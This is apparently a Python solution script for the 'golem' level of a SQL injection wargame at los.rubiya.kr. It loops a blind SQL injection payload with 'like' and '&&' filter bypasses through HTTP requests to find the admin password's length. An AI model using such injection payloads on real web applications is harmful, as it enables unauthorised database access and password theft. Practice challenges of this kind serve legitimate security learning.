import urllib3
import requests

url = "https://los.rubiya.kr/chall/golem_4b5202cfedd8160e73124b5234235ef5.php?pw="
header = {"Cookie":"PHPSESSID=YOUR COOKIE VALUE"} #본인의 cookie 값을 코드에 입력

length = 0

for i in range(0,100):
    query = "1'||id like 'admin'%26%26length(pw) like {}%23".format(i)
    req = requests.get(url+query, headers=header)
    print(url+query)
    print("[+] send req length is {}".format(i))
    if "Hello admin" in req.text:
        length = i
        break

print(length)
